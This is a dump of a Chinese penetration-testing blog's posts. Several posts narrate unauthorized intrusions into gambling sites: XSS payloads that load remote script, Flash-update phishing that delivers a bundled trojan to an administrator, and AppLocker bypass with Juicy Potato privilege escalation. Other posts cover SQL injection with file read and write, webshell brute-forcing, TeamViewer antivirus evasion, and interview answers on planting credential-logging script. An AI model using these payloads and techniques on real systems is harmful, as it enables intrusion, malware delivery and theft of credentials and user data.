超长字符不仅仅可以应用在Bypass安全狗注入，利用参数污染，XSS也是可以滴。","link":"/2019/11/11/BC%E5%AE%9E%E6%88%98Bypass%E5%AE%89%E5%85%A8%E7%8B%97/"},{"title":"BC实战|从Xss到主机上线","text":"要保持学习的好习惯，这次平时学的就用上了。 故事的起因前几天收到一封邮件，内容是这样的： 你说发谁哪里不好，发到我这里来，正好最近辞职了没事干，搞下看看。 加上那个人的好友以后，象征性的聊了几句，大概就是：我说自己因为网赌没钱借了高利贷，让他带我玩这个，好还上贷款，没说几句就给我发了网址和邀请码（这个站没邀请码注册不上），让我去网站里面充钱，我说好，我先去冲一千，完事师傅你一定要好好带我，然后就去注册了（后来我没充钱，他就一直抖我，给我发消息，觉得烦就把他删了，所以聊天记录也没了，简单口述下没截图）。 漏洞挖掘官网截图 信息收集阶段略过，太麻烦了，有云盾（WAF+CDN），看下面云悉指纹识别的图吧，测试各种功能点，没有结果，不得不说，大部分BC安全都是做的不错的。 想了会，看到一个聊天室功能，进去看看都在说啥，结果发现说话来来回回就那几个人，偶尔有几个和我一样的普通会员，我就感觉，这尼玛是不是托啊，一堆什么导师嚷嚷着跟着下注。 职业习惯：看见框就想叉，一发xss payload打过去： 1&lt;/tExtArEa&gt;'&quot;&gt;&lt;sCRiPt sRC=XSSURL&gt;&lt;/sCrIpT&gt; wdnmd没反应？明明加载了啊…问了下别的师傅，说这种情况有可能是有CSP，附上相关介绍，我这里就不解释了，本来打算放弃，想了下万一 img 的没有被限制呢。 再吃我一发： 1&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';&gt; 叮 ~ 叮 ~ 手机响了，多么美妙的声音，payload成功执行，打来一堆cookie（还是不同域名），然而现实是残酷的，这个站有HttpOnly，cookie不能用，历史密码也没拿到，不过不要灰心，咱还有更猥琐的办法。 Flash钓鱼既然正面肛不动你，咱就来侧面的。前段时间经常看到无常师傅的flash钓鱼操作，很经典啊，然后就想到自己有天会用到flash官网的钓鱼源码，很早就写好了放在GitHub上：传送门。 前期准备一个免费空间，一个免费域名（域名可以搞一个 www.flashxxx.tk 这种的，可信度比较高），一个可以正常上线的马子。 然后xss平台搞个模块，简单解释下代码，一开始重写alert方法并屏蔽网址显示，弹出Flash升级提示，跳转至钓鱼页： 关于马子可以做到运行正常安装文件的同时运行马子，骚姿势：自解压捆绑文件的利用 为了让自解压的exe文件可以正常运行（已经改成了正常的安装文件图标），必须确保他有解压软件，我就把钓鱼页的自解压文件压缩了下，成了 flashplayerpp_install_cn.zip，这样一来他必须安装解压文件才能打开安装程序，马子自然生效了。 关于免杀由于技术有限，毕竟咱也不是搞免杀的，生成的马子会被部分杀软报毒，也不知道对面用什么杀软，所以想了个猥琐但有效的办法，其实不少下载站下载的文件也爱这么干，哈哈。 一切就绪万事俱备，只欠东风，直接发出去刚才写的升级提示+跳转的xss payload： 页面成功弹出提示，对方不点确定页面就一直卡住，点了确定就跳来我的钓鱼页（这里钓鱼页也加了点料，让他点返回时无限回跳钓鱼页） 不过一开始并没有人上线，再点进去一看管理员重置了聊天页的内容。奥利给曾经说过：我们遇到什么困难也不要怕，咱换个号继续叉呗，在间歇性叉叉圈圈了十几次之后，管理员可能是实在忍不住了（管理员：大哥你别弹了，我装还不行嘛），终于运行了我的马子。 成功上线：这里就上线了一台，不过很幸运，是管理员的机器，不然之前的努力都白费了。 看一会对面在干哈： 这个清楚点，可以看到还依然打开着钓鱼页，俩人还讨论亏钱了，笑死了： 打开了一个账面，这流水咱也看不懂： 再看看有存着啥好东西，两个硬盘一个U盘，C盘E盘没有什么： F盘里有料了，都是一些会员数据，账单流水，管理后台配置啥的： 点到为止：不多说了，看了下上线的IP，为了挣钱跑的挺远，老哥背井离乡怪不容易的，祝你安安心心的回到祖国的怀抱过个年吧。。。","link":"/2019/12/08/BC%E5%AE%9E%E6%88%98%E4%BB%8EXss%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/"},{"title":"BC实战|后渗透之Bypass Applocker到提权","text":"冷静分析，沉着应对。 0x01 前言提示：当个反面案例看就好，实际上拿下的方式远没有下文说的那么麻烦，只怪自己太心急…本来是之前BC项目搞下来的一个推广站，当时只拿到了Shell 权限是一个普通用户，想提权进一步收集服务器上的信息时，发现运行各种东西都是权限拒绝，提示组策略阻止了这个程序，当时因为还有的别的事情，就没继续研究了（用户名比较敏感，后面全程打码）。 0x02 Bypass Applocker最近突然想起来了，就继续搞一下，问了下群里的师傅 知道是什么东西以后就好说了，耐心找一找总会有收获的，附上Applocker介绍： https://baike.baidu.com/item/Applocker/2300852?fr=aladdin 然后就找到3g师傅的一篇文章： https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/ 具体怎么利用就自行看文章吧，看完文章后续的大概思路差不多就清晰了 0x03 上线到提权我想的是bypass applocker让目标服务器执行我的马子上线后在进行后续的提权，然而Shell下执行 net user、tasklist /SVC 等等都没得回显，不然可以通过进程对比判断下杀软（自己写的小轮子，目前可匹配进程已经增加到960+了：http://get-av.se7ensec.cn/ ） 既然不知道，那我就拼一拼人品，赌一下主机里没有杀软，通过上面3g师傅文章的第三种方式运行了我的马子，然后就成功上线了，忽略下面那个机器… CS上线以后再运行某些命令，比如下面这个，还有tasklist /SCV发现还是会拒绝访问 然后又尝试了下CS内置的查看系统进程命令 ”ps“，成功列出了系统进程，看了下确实是没有杀软的 /* 忘了截图 */ 运行 “shell systeminfo” 发现系统和补丁信息居然可以看到了，然而系统根本没打几个补丁，运气有点好，看了下用户权限，符合Juicy Potato的要求，可以直接尝试下烂土豆提权： https://www.4hou.com/posts/vZoL 经过测试发现上线以后（实际上本来就有执行权限，当时没有想到不对劲，事后总结文章时才意识到不太对，详见文末），C:\\Users\\Public\\下有了执行权限，用Juicy Potato带个whoami参数执行下，成功返回了system 再直接用它执行下马子，等几秒就会过来一个System的会话了，翻了翻目录发现还是个站群 Administrator权限截个屏看下，怪不得那么多，原来人家都是批量建站的： 0x04 总结碰巧这次运气好没有遇到杀软，不然肯定会是一路坎坷，也会更有挑战性 最失败的是这次自己没有提前全面了解Applocker的一些功能介绍： https://www.anquanke.com/post/id/159892 ，心急的搜到了bypass方法就开始用，其实这次遇到的只是文件路径的限制，C:\\Users\\Public\\就可以执行程序，早一点发现的话也不会那么费劲，不过能完整了解到Applocker的机制，也算是一个收获吧 最后感谢下haya、Beli1v1师傅的指点和帮助。","link":"/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/"},{"title":"Burpsuite爆破含CSRF-Token的程序","text":"1. 抓包0x01 开启burpsuite代理，抓取数据包，将请求包转送到Intruder 2. 设置0x02 Attack type选择Pitchfork，将passwod和user_token设置攻击位置 0x03 在options栏找到Grep - Extract，点击Add，然后点击Refetch response,进行一个请求，即可看到响应报文,直接选取需要提取的字符串，上面的会自动填入数据的起始和结束标识 点击“OK”返回，可以在列表中看到一个grep项 0x04 返回payloads栏，payload 1 设置密码字典 payload 2 选择payload type为“Recursive grep”，然后选择下面的extract grep项即可 3. 攻击0x05 从Results中可以看到每一次访问获取到的token作为了每次请求的参数，最终爆破出结果","link":"/2018/10/21/Burpsuite%E7%88%86%E7%A0%B4%E5%90%ABCSRF-Token%E7%9A%84%E7%A8%8B%E5%BA%8F/"},{"title":"JS快速提取URL","text":"控制台运行，快速提取页面url Google12345var i = document.getElementsByClassName('r');for(var z=0;z&lt;i.length;z++){ var url = i[z].getElementsByTagName('a'); console.log(url[0].href)} Bing12345var h3 = document.getElementsByTagName('h2');for(var i=0;i&lt;h3.length;i++){ var a = h3[i]. getElementsByTagName('a'); console.log(a[0].href);}","link":"/2019/01/01/JS%E5%BF%AB%E9%80%9F%E6%8F%90%E5%8F%96URL/"},{"title":"MySQL不知道列名情况下的注入","text":"最近感觉脑子空空，全在为了刷洞去挖洞，还是回归技术的本身让自己舒服些。 前提以下情况适用于 MySQL &lt; 5版本，或者在 MySQL &gt;= 5 的版本[存在information_schema库]，且已获取到库名和表名 ① 当只能获取到表名，获取不到列名或者只能获取到无有效内容的列名情况【例如 id】 ② 当希望通过information_schema库中的表去获取其他表的结构，即表名、列名等，但是这个库被WAF过滤掉的情况 其实个人感觉这个方法还是对 5 版本以下的实用性比较强一些，因为对我来说，一般遇到waf就放弃了（菜的真实23333） 解决正常的查询：以下是正常查询 test 库中的 user 表内容 1select * from user; UNION查询:1select 1,2,3,4 union select * from user; 数字对应列查询：可以使用数字来对应列来进行查询，如 2 对应了表里面的 name 列 1select `2` from (select 1,2,3,4 union select * from user)a; 别名代替查询：当反引号 ` 不能使用的时候，可以使用别名来代替，如设置 2 的别名为 b 1select b from (select 1,2 as b,3,4 union select * from user)a; 多列合并查询：同上：这里反引号不能用的话，一样可以使用别名代替 1select concat(`2`,0x3a,`3`) from (select 1,2,3,4 union select * from user)a limit 1,1; 仅作翻译以及思路整理 原文链接：https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/","link":"/2019/03/21/MySQL%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%97%E5%90%8D%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5/"},{"title":"Mysql手工注入笔记","text":"数据库版本 &gt; Mysql 5.0※本文不对 Mysql 5.0以下版本再做研究 自带数据库：information_schema information_schema：存储mysql下所有信息的数据库（数据库名，表名，列名） Mysql数据库结构： 符号.代表下一级的意思 1234567information_schema.schemata -[存储mysql下所有**数据库**名信息的表]information_schema.tables -[存储所有数据库下的**表名**信息的表]information_schema.columns -[存储所有数据库下的**列名**信息的表]schema_name -[information_schema.schemata中存储的库名]table_name -表名column_name -列名table_schema -数据库名 information_schema 数据库辅助理解结构图: 常用注入参数及解释：12345678910111213database() -数据库名user() -数据库用户version() -数据库版本@@version_compile_os -操作系统group_concat() -多条数据合并一行--+ 或 # -注释符and ord(mid(user(),1,1))=114 -判断是否ROOT权限 返回正确即存在and (select count(*) from mysql.user)&gt;0 -返回正常,说明具有读写权限，反之数据库帐户被降权and ord(mid(version(),1,1))&gt;51 -确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，3.0以上版本，可以用union方法ord() -获取二进制码mid() -截位操作limit a,b (limit a offset b) -限制查询结果的条数，具体区别百度~... 联合查询注入：※ [ = 号之后的值，用hex编码0x...或者'XXX'替换使用都可以] 获取所有库名1union select group_concat(schema_name) from information_schema.schemata 获取指定库名-&gt;所有表名1union select group_concat(table_name) from information_schema.tables where table_schema='库名' 获取指定库名-&gt;指定表名-&gt;所有列名1union select group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema='库名' 获取指定库名-&gt;指定表名-&gt;指定列名-&gt;所有数据内容1union select group_concat(username,&quot;::&quot;,password) from 库名.表名 文件读写：读文件常见的读文件，可以用16进制代替字符串 1234select load_file('c:/boot.ini')select load_file(0x633a2f626f6f742e696e69)select load_file('//127.0.1/1.txt') # smb协议select load_file('\\\\\\\\127.0.0.1\\\\1.txt') # 可用于DNS隧道 写文件常见的写文件，可以用16进制代替字符串 12select 0x... into outfile 'D:/1.txt'select 0x... into dumpfile 'D:/1.txt' 顺带说一下 dumpfile与outfile函数的区别 SELECT into outfile -导出到一个txt文件，可以导出每行记录的，这个很适合导库 SELECT into dump-只能导出一行数据 如果想把一个可执行二进制文件用into outfile函数导出，导出后，文件会被破坏。因为into outfile函数会在行末端写新行，更致使的是会转义换行符，这样2进制可执行文件就会被破坏 这时，我们能用into dumpfile导出一个完整能执行的2进制文件，它不对任何列或行进行终止，也不执行任何转义处理 总结： into outfile-导出内容 into dumpfile-导出二进制文件 关于其它的注入方法本文不在赘述，学习链接推荐：传送门","link":"/2018/10/30/Mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"},{"title":"ShellBruter|WebShell高效爆破字典生成","text":"江湖人称轮子妈。 爆破思路参考： https://www.t00ls.net/thread-36985-1-1.html 这里不继续用python写请求的原因是感觉让burp处理这些会更好（懒） 使用示例： 假设当前shell为： 1&lt;?php @eval($_POST[a]);?&gt; 1）burp加载生成的爆破字典 2）关闭URL编码（很重要） 3）得到结果 此方法可灵活使用，其余可自由发挥。 github地址： https://github.com/r00tSe7en/ShellBruter","link":"/2020/03/22/ShellBruter/"},{"title":"TeamViewer在BypassAV中的妙用","text":"这里直接拿360开刀，火绒安静归安静，杀毒能力还是比360差点的。 TV官方免安装版这是teamviewer官网下载页面： https://www.teamviewer.cn/cn/download/windows/ ，大部分人都习惯直接下载这个安装版来用 不知道大家有没有注意过，其实teamviewer也提供了免安装版的，就在安装版的下方 Bypass 360以下全部为联网且查杀引擎全开的情况下操作（见文章封面） 正常运行下图是正常方式运行TeamViewerQS.exe，虽然有提示，但是可以看到默认的选项是 允许操作 的 WebShell下运行假设现在我有这台主机的WebShell，直接在大马中执行这个文件 发现成功弹了出来 但是我们怎么获取id和密码呢，土司有大佬分享过修改过的tv，支持把账号密码输出到文件，但是后期肯定还是会被杀，今天看到了CoolCat师傅的文章：传送门，文章中有个通过截屏思路获取还是不错的，不过CoolCat师傅用的python截屏，实际上谁也不想每次都去目标机上装个python环境吧，还是应该怎么简单怎么来 关于屏幕截取github上有不少命令行下截屏的项目，我随便找了一个：https://github.com/darealshinji/cmdline-screenshot-tool 在WebShell中，执行一下 screenshot-advanced64.exe，发现被360拦截了，c++写的东西360报java漏洞攻击我就不清楚为啥了… 简单绕过360这里绕过方式也很简单，screenshot-advanced64.exe 的后缀改成.7z（命令行下执行二进制文件可以无视后缀名），然后上传上来再执行 然后看一下网站根目录 screenshost.png就是生成的屏幕截图，如下 Kill 360拿着账号密码直接连，有了远程桌面的权限，360还怕干不掉？ 注意 目标机要确定可以连接TeamViewer的服务器 要使用远程桌面用户权限去运行TeamViewerQS.exe，不然连上也是黑屏 以上应用场景只适合管理员不在的时候，因为一旦建立远程会话双方都是会看到的","link":"/2020/01/05/TeamViewer%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/"},{"title":"get_AV|Windows杀软在线对比辅助","text":"解决平时渗透时的痛点。 在渗透测试过程中，Windows主机上总会遇到各种各样的杀软，人工去看系统进程也是比较麻烦的一件事。 然后发现网上好像也没人写过这个东西，就有了这个Windows杀软在线对比辅助。 GitHub：https://github.com/r00tSe7en/get_AV 在线版：Windows杀软在线对比辅助 分享出来，一是为了方便有需要的人，二是也希望表哥们可以分享一些平时遇到的比较冷门的杀软进程，后续GitHub和在线版会一直保持同步更新数据。","link":"/2019/09/01/Windows%E6%9D%80%E8%BD%AF%E5%9C%A8%E7%BA%BF%E5%AF%B9%E6%AF%94%E8%BE%85%E5%8A%A9/"},{"title":"Tor-IP-Changer实现Sqlmap自动切换代理IP","text":"sqlmap注入的过程中总出现被ban掉IP的情况，面对一片大姨妈，没有代理池只能放弃？ 使用工具：小飞机、Proxifier、Tor Browser、Tor IP Changer（传送门）、Sqlmap 操作步骤：首先连上小飞机 配置Proxifier配置代理服务器 配置代理规则 此时你已经是全局代理状态了 配置并打开Tor浏览器（不要关闭） 打开Tor IP Changer点击 TOR server -&gt; Start，等待软件自动配置完成 点击 Options -&gt; Settings -&gt; Interval(IP切换间隔时间，越快越不稳）-&gt; Save 点击 IP changer -&gt; Start，如下图所示即为成功 Sqlmap命令1sqlmap.py -u url --tor --tor-type=&quot;SOCKS5&quot; 参考文章：使用此方法在匿名度，安全性上都可以大大提高，不过代价就是要牺牲掉一部分速度和稳定性。 https://www.freebuf.com/column/171981.html","link":"/2019/07/08/Tor-IP-Changer%E5%AE%9E%E7%8E%B0Sqlmap%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2%E4%BB%A3%E7%90%86IP/"},{"title":"Xss之HttpOnly下的攻击手法","text":"仅作思路整理，实际利用代码未提供，请自行收集。 1.phpinfo页伪造对方身份访问同站的phpinfo页面，因为同域所以通过ajax提交访问可以读取到responseText，其中$_SERVER[“HTTP_COOKIE”]会打印出具有httponly属性的cookies。 优点：成功率很高，最不容易被察觉，也是最常用的一种方式。 缺点：需要phpinfo页，条件苛刻。 2.框架钓鱼通过&lt;iframe&gt;标签嵌入一个远程域，完全撑开后，以覆盖原有的页面。 优点：无跳转，域名无改变。 缺点：通常会覆盖某个正常的页面，管理员易察觉。 3.跳转钓鱼通过购买相似域名，构建相同的钓鱼页面，使受害者跳转至钓鱼站。 优点：主动性较强，可主动钓鱼。 缺点：成本较高，且由于页面跳转过于明显，所以此方法十分容易被发现。 4.历史密码通过js伪造登录表单，欺骗浏览器自动填入，由此获取浏览器记住的历史密码。 优点：不易被发现，可直接获取明文，成功率较高。 缺点：各内核浏览器兼容性不一，最新版google已不支持http协议下的自动填入功能。 5.获取源码通过xss获取后端页面源码，常常可以发现一些越权访问，或者配合CSRF打组合拳去添加新用户或者执行其他的功能，以及通过审计后台js发现一些漏洞等。 优点：信息获取的比较详细，也可以获取到后台账号名称。 缺点：局限性较大，不易于利用。 欢迎师傅们补充。。","link":"/2019/10/26/Xss%E4%B9%8BHttpOnly%E4%B8%8B%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"},{"title":"新的起点，新的开始！","text":"博客始建于2016年九月份，最开始用的是ZBLOG，后来因为修改博客后台配置文件导致后台崩溃； 但是既然当初决定要写博客，我想就算是重新来一次，我也要坚持写下去；因为我感觉博客不只是知识的巩固，还是成长的记录；于是，我将原来博客的40多篇文章保存到本地后，重置了服务器；之后我选择了用WordPress建站程序，因为感觉wp比较稳定；至此，我的新博客又重新开启了；","link":"/2017/05/04/hello-world/"},{"title":"一处图片引用功能导致的XSS","text":"未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。 山重水复疑无路漏洞点：站点产品评论处 初步测试一开始尝试XSS，发现程序有过滤，提交均显示Tags are not permitted，最后测出来的是过滤 &lt; ，不过滤 &gt; 因为提示速度比较快，猜测前端有一层检测。尝试绕过前端检测，burp拦截正常提交的内容，替换xss payload后发送，发现会自动跳转回首页，由此发现程序后端也有内容检测，这里直接xss暂时行不通。 查看编辑器的其他功能： 图片上传：可上传aspx（其他可能解析后缀均已尝试），不能解析并跳转至首页。可上传html并解析，这种方式构造的xss通常需要主动攻击，且攻击时易被管理员察觉到异常，暂不考虑。 表情功能：没什么可利用的。 柳暗花明又一村当看到编辑器提示的 img 外部图片引用方式时引起了我的注意，这里感觉可以操作一下： 正常测试先来看下正常引用方式时前端的显示，链接被带入到src中（logo前文字涉及域名，打码）： 1[img|XSSURL|xxxxx Logo] 带入payload把xss payload 放在链接的位置再看一下： 1234常规的payload：&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';&gt;构造的payload：[img|x onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';|xxxxx Logo] 提交后审查元素发现为如下显示： 尝试闭合尝试闭合 x 处的双引号，让 onerror 逃逸出来： 1[img|x&quot; onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';|hello] 这里提交后发现payload并没有执行成功，仔细看发现程序输出时分别在 onerror= 和 ; 后面加了双引号。 闭合成功直接给个 &gt; 让它闭合，虽然成功加载了，但是页面显示会有错误，这样十分容易被发现倪端，不够完美。 1[img|x&quot; onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';&gt;|hello] 换个思路通过闭合掉 ; 后面的双引号，显示效果如下： 1[img|x&quot; onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL';&quot;|hello] 最终在没有任何错误内容显示的情况下成功执行了xss payload： 看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。 灵活运用这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。 本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。 1x onerror=s=createElement('script');body.appendChild(s);s.src='XSSURL'; 这里直接把payload放进去，看下前端显示 同样的思路，这里直接闭合就好了 1x&quot; onerror=&quot;s=createElement('script');body.appendChild(s);s.src='XSSURL'; 成功加载payload 平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。","link":"/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/"},{"title":"一星期实战总结（二）","text":"Hey, password is required here. ","link":"/2020/02/24/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%932/"},{"title":"一套渗透测试岗面试题","text":"转载：阿里安全应急响应中心微信公众号 1.拿到一个待检测的站，你觉得应该先做什么？ ​ 1)信息收集​ 1，获取域名的whois信息,获取注册者邮箱姓名电话等。​ 2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。​ 3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞​ 4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。​ 5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针​ 6，google hack 进一步探测网站的信息，后台，敏感文件​ 2）漏洞扫描​ 开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，​ 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等​ 3）漏洞利用​ 利用以上的方式拿到webshell，或者其他权限​ 4）权限提升​ 提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权​ 5) 日志清理​ 6）总结报告及修复方案 2.判断出网站的CMS对渗透有什么意义？ ​ 查找网上已曝光的程序漏洞。 ​ 如果开源，还能下载相对应的源码进行代码审计。 3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？ ​ 敏感文件、二级目录扫描 ​ 站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点 4.常见的网站服务器容器。 ​ IIS、Apache、nginx、Lighttpd、Tomcat 5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？ ​ root权限以及网站的绝对路径。 6.目前已知哪些版本的容器有解析漏洞，具体举例。 ​ IIS 6.0​ /xx.asp/xx.jpg “xx.asp”是文件夹名 ​ IIS 7.0/7.5​ 默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析 ​ Nginx​ 版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。​ 空字节代码 xxx.jpg.php ​ Apache​ 上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀 ​ lighttpd​ xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！ 7.如何手工快速判断目标站是windows还是linux服务器？ ​ linux大小写敏感,windows大小写不敏感。 8.为何一个mysql数据库的站，只有一个80端口开放？ ​ 更改了端口，没有扫描出来。 ​ 站库分离。 ​ 3306端口不对外开放 9.无法连接3389的几种情况 ​ 没开放3389 端口 ​ 端口被修改 ​ 防护拦截 ​ 处于内网(需进行端口转发) 10.如何突破注入时字符被转义？ ​ 宽字符注入 ​ hex编码绕过 11.在某后台新闻编辑界面看到编辑器，应该先做什么？ ​ 查看编辑器的名称版本,然后搜索公开的漏洞。 12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？ ​ 能做的事情很多，用隐藏网马来举例子：​ 插入​ &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php ​ .jpg文件会被解析成.php文件。 ​ 具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。 13.注入漏洞只能查账号密码？ ​ 只要权限广，拖库脱到老。 14.安全狗会追踪变量，从而发现出是一句话木马吗？ ​ 是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。 15.access 扫出后缀为asp的数据库文件，访问乱码，**如何实现到本地利用？** ​ 迅雷下载，直接改后缀为.mdb。 16.提权时选择可读写目录，为何尽量不用带空格的目录？ ​ 因为exp执行多半需要空格界定参数 17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？ ​ 同数据库。 18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？ ​ and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。 19:某个防注入系统，在注入时会提示： 系统检测到你有非法注入的行为。已记录您的ip xx.xx.xx.xx时间:2016:01-23提交页面:test.asp?id=15提交内容:and 1=1 20、如何利用这个防注入系统拿shell？ 在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：http://ytxiao.lofter.com/post/40583a_ab36540。 21.上传大马后访问乱码时，有哪些解决办法？ ​ 浏览器中改编码。 22.审查上传点的元素有什么意义？ ​ 有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？ ​ 先爆破用户名，再利用被爆破出来的用户名爆破密码。 ​ 其实有些站点，在登陆处也会这样提示 ​ 所有和数据库有交互的地方都有可能有注入。 24.目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？ ​ 这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。 25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？ ​ 直接在网站二级目录/abc/下扫描敏感文件及目录。 26.在有shell的情况下，如何使用xss实现对目标站的长久控制？ ​ 后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。 ​ 在登录后才可以访问的文件中插入XSS脚本。 27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？ ​ 审查元素 把密码处的password属性改成text就明文显示了 28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？ ​ 原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过 29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？ ​ 在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。 30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？ ​ 隐藏文件夹，为了不让管理员发现你传上去的工具。 31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由： A. demo.jsp?id=2+1 B. demo.jsp?id=2-1选B，在 URL 编码中 + 代表空格，可能会造成混淆 32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？ demo.do?DATA=AjAxNg==DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试 33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？ 有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell 34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？ XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验RefererXXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。 35、CSRF、SSRF和重放攻击有什么区别？ CSRF是跨站请求伪造攻击，由客户端发起SSRF是服务器端请求伪造，由服务器发起重放攻击是将截获的数据包进行重放，达到身份认证等目的 36、说出至少三种业务逻辑漏洞，以及修复方式？ 密码找回漏洞中存在 1）密码允许暴力破解、 2）存在通用型找回凭证、 3）可以跳过验证步骤、 4）找回凭证可以拦包获取 等方式来通过厂商提供的密码找回功能来得到密码。身份认证漏洞中最常见的是 1）会话固定攻击 2） Cookie 仿冒 只要得到 Session 或 Cookie 即可伪造用户身份。验证码漏洞中存在 1）验证码允许暴力破解 2）验证码可以通过 Javascript 或者改包的方法来进行绕过 37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？ get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”HTTP/1.1Host:.com:82User-Agent:Mozilla/5.0 Firefox/40Accept:text/css,/;q=0.1Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3Referer:http://****.com/eciop/orderForCC/cgtListForCC.htm?zone=11370601&amp;v=145902Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;st_uid=N90PLYHLZGJXI-NX01VPUF46W;status=TrueConnection:keep-alive 